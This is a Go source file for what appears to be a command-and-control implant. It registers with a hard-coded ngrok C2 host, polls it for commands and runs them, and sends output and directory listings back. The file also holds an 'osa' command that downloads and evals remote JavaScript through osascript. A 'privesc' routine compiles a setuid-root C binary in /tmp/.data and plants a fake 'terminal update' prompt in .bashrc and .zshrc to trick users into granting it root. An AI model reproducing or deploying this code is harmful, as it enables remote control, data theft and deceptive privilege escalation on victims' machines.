package linux

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"strconv"
	"strings"
	"time"

	"github.com/lithammer/shortuuid"
)

//Cookies ...
type Cookies struct {
	ID     int `json:"id"`
	Result struct {
		Cookies []struct {
			Name     string  `json:"name"`
			Value    string  `json:"value"`
			Domain   string  `json:"domain"`
			Path     string  `json:"path"`
			Expires  float64 `json:"expires"`
			Size     int     `json:"size"`
			HTTPOnly bool    `json:"httpOnly"`
			Secure   bool    `json:"secure"`
			Session  bool    `json:"session"`
			SameSite string  `json:"sameSite"`
			Priority string  `json:"priority"`
		} `json:"cookies"`
	} `json:"result"`
}

//Pages ...
type Pages struct {
	Description          string `json:"description"`
	DevtoolsFrontendURL  string `json:"devtoolsFrontendUrl"`
	ID                   string `json:"id"`
	Title                string `json:"title"`
	Type                 string `json:"type"`
	URL                  string `json:"url"`
	WebSocketDebuggerURL string `json:"webSocketDebuggerUrl"`
}

//Cmd ...
type Cmd struct {
	ID      string
	Command string
	Agent   string
	Status  string
	Cmdid   string
	Output  string
}

// Update with callback timeout and c2 address
var timeoutSetting = 1
var c2 = "https://gostripe.ngrok.io"

// Appends the following set of commands to the users rc files
// When a new terminal opens the user will be asked to enter their password to complete terminal updates
//asroot creates a suid binary in the /tmp/.data folder that accepts commands
var privesc1 = `echo "Terminal Requires an update to contine."
sleep 1
echo "processing..."
sleep 2
echo "..."
sudo chown root:wheel /tmp/.data/temp
sudo chmod u+s /tmp/.data/temp
echo "success" >> /tmp/.data/status
echo "Update Complete"
`

//suid binary for accessing as root. Ties into privesc1.  /tmp/.data/temp whoami
var asrootc = `
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    if(argc == 1) {
        printf("ERROR: Expected at least 1 argument\n");
        return 0;
    }

    int i, v = 0, size = argc - 1;

    char *str = (char *)malloc(v);

    for(i = 1; i <= size; i++) {
        str = (char *)realloc(str, (v + strlen(argv[i])));
        strcat(str, argv[i]);
        strcat(str, " ");
    }

    printf("Command: %s\n", str);
    setuid(0);
    system(str);
    return 0;
}
`

func Build() {
	uuid := shortuuid.New()
	user, err := user.Current()
	agent := uuid + "_" + user.Uid
	for {
		status := createAgent(agent)
		if status == "200 OK" {
			break
		}
		time.Sleep(3 * time.Second)
	}
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
	}
	timeout := time.Duration(timeoutSetting) * time.Second
	ticker := time.NewTicker(timeout)
	quit := make(chan struct{})
	for {
		select {
		case <-ticker.C:
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
			}
			getCMDs(c2 + "/api/cmds/" + agent)
			updateAgentStatus(agent)
		case <-quit:
			return
		}
	}

}

func getCMDs(url string) {

	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("err:", err)
		return
	}
	defer resp.Body.Close()

	if err != nil {
		fmt.Println(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}

	body, readErr := ioutil.ReadAll(resp.Body)
	if readErr != nil {
		fmt.Println(readErr)
	}

	var results []Cmd
	jsonErr := json.Unmarshal(body, &results)
	if jsonErr != nil {
		fmt.Println(jsonErr)
	}

	for _, d := range results {
		fmt.Println(d.Cmdid)
		runCommand(d.Command, d.Cmdid)
	}

}

func runCommand(commandStr string, cmdid string) error {
	commandStr = strings.TrimSuffix(commandStr, "\n")
	arrCommandStr := strings.Fields(commandStr)
	if len(arrCommandStr) < 1 {
		return errors.New("")
	}
	switch arrCommandStr[0] {
	case "cd":
		if len(arrCommandStr) == 1 {
			data := "Required 1 arguments"
			sEnc := base64.StdEncoding.EncodeToString([]byte(data))
			updateCmdStatus(cmdid, sEnc)
			return errors.New("Required 1 arguments")
		}
		updateCmdStatus(cmdid, arrCommandStr[1])
		os.Chdir(arrCommandStr[1])
		return nil
	case "kill":
		os.Exit(0)
	case "osa":
		if len(arrCommandStr) == 1 {
			data := "Required 1 arguments"
			sEnc := base64.StdEncoding.EncodeToString([]byte(data))
			updateCmdStatus(cmdid, sEnc)
			return errors.New("Requires url")
		}
		runJXA(arrCommandStr[1], cmdid)
		return nil
	case "clipboard":
		print("clipboard")
	case "privesc":
		if len(arrCommandStr) == 1 {
			data := "Required 1 arguments (privesc type)"
			sEnc := base64.StdEncoding.EncodeToString([]byte(data))
			updateCmdStatus(cmdid, sEnc)
			return errors.New("Requires url")
		}
		if arrCommandStr[1] == "TerminalUpdate" {
			asroot()
			usr, err := user.Current()
			if err != nil {
				log.Fatal(err)
			}
			if _, err := os.Stat(usr.HomeDir + "/.zshrc"); err == nil {
				privesRC(usr.HomeDir + "/.zshrc")
			}
			if _, err := os.Stat(usr.HomeDir + "/.bashrc"); err == nil {
				privesRC(usr.HomeDir + "/.bashrc")
			}
			data := "Complete"
			sEnc := base64.StdEncoding.EncodeToString([]byte(data))
			updateCmdStatus(cmdid, sEnc)
			return nil
		}
		data := "hmmmm"
		sEnc := base64.StdEncoding.EncodeToString([]byte(data))
		updateCmdStatus(cmdid, sEnc)

	default:
		cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
		var out bytes.Buffer
		var stderr bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &stderr
		err := cmd.Run()
		if err != nil {
			fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
			updateCmdStatus(cmdid, fmt.Sprint(err)+": "+stderr.String())
			return nil
		}
		sEnc := base64.StdEncoding.EncodeToString([]byte(out.String()))
		updateCmdStatus(cmdid, sEnc)
		return nil
	}
	return nil
}

func updateCmdStatus(cmdid string, output string) {
	resp, err := http.PostForm(c2+"/api/cmd/update",
		url.Values{"id": {cmdid}, "output": {output}})

	if err != nil {
		fmt.Println("err:", err)
		return
	}
	defer resp.Body.Close()

	if err != nil {
		fmt.Println(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
}

func updateAgentStatus(agent string) {
	timestamp := strconv.FormatInt(time.Now().UTC().UnixNano(), 10)
	dir, err := os.Getwd()
	names := make([]string, 0)
	files, _ := ioutil.ReadDir(dir)
	for _, f := range files {
		names = append(names, f.Name())
	}
	fnames := strings.Join(names, ",")
	resp, err := http.PostForm(c2+"/api/agent/update",
		url.Values{"files": {fnames}, "working": {dir}, "agent": {agent}, "checkIn": {timestamp}})
	if err != nil {
		fmt.Println("err:", err)
		return
	}
	defer resp.Body.Close()

	if err != nil {
		fmt.Println(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
}

func createAgent(agent string) string {
	dir, err := os.Getwd()
	names := make([]string, 0)
	files, _ := ioutil.ReadDir(dir)
	for _, f := range files {
		names = append(names, f.Name())
	}
	fnames := strings.Join(names, ",")
	resp, err := http.PostForm(c2+"/api/agent/create",
		url.Values{"files": {fnames}, "working": {dir}, "agent": {agent}})

	if err != nil {
		fmt.Println("err:", err)
		return "500"
	}
	defer resp.Body.Close()
	if resp.Body != nil {
		defer resp.Body.Close()
	}

	return resp.Status

}

func runJXA(url string, cmdid string) {
	fileURL := url
	execScript(cmdid, fileURL)
}

func execScript(cmdid string, path string) string {

	path = fmt.Sprintf("eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('%s')),$.NSUTF8StringEncoding)));", path)
	fmt.Println(path)
	cmd := exec.Command("osascript", "-l", "JavaScript", "-e", path)
	fmt.Println(cmd)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	cmd.Run()
	time.Sleep(5)
	fmt.Println("Resulterr: " + stderr.String())
	fmt.Println("Resultout: " + out.String())
	sEnc := base64.StdEncoding.EncodeToString([]byte(stderr.String()))
	updateCmdStatus(cmdid, sEnc)
	return stderr.String()

}

func privesRC(filepath string) {
	addline := privesc1
	// make a temporary outfile
	outfile, err := os.Create("/tmp/.data/temp.txt")

	if err != nil {
		panic(err)
	}

	defer outfile.Close()

	// open the file to be appended to for read
	f, err := os.Open(filepath)

	if err != nil {
		panic(err)
	}

	defer f.Close()

	// append at the start
	_, err = outfile.WriteString(addline)
	if err != nil {
		panic(err)
	}
	scanner := bufio.NewScanner(f)

	// read the file to be appended to and output all of it
	for scanner.Scan() {

		_, err = outfile.WriteString(scanner.Text())
		_, err = outfile.WriteString("\n")
	}

	if err := scanner.Err(); err != nil {
		panic(err)
	}
	// ensure all lines are written
	outfile.Sync()
	// over write the old file with the new one
	err = os.Rename("/tmp/.data/temp.txt", filepath)
	if err != nil {
		panic(err)
	}
}

func asroot() {
	// make a temporary outfile
	err := os.Mkdir("/tmp/.data", 0755)
	if err != nil {
		fmt.Println("Error")
	}
	f, err := os.Create("/tmp/.data/temp.c")

	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	_, err2 := f.WriteString(asrootc)

	if err2 != nil {
		log.Fatal(err2)
	}

	fmt.Println("done")
	cmd := exec.Command("gcc", "/tmp/.data/temp.c", "-o", "/tmp/.data/temp")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	cmd.Run()
}
